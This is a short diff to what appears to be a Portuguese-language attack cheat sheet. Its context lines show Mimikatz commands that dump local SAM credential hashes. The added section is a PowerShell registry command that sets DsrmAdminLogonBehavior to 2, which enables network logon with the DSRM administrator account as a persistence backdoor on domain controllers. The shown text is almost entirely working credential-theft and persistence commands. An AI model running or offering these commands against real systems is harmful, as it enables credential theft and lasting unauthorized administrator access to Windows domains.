@@ -1512,8 +1512,10 @@ privilege::debug
 token::elevate
 lsadump::sam
 ```
-
-
+CRIAR ENTRADA NO REGISTRO PARA LIBERAR LOGIN DO ADMINISTRADOR LOCAL
+```
+New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD
+```
 
 
 
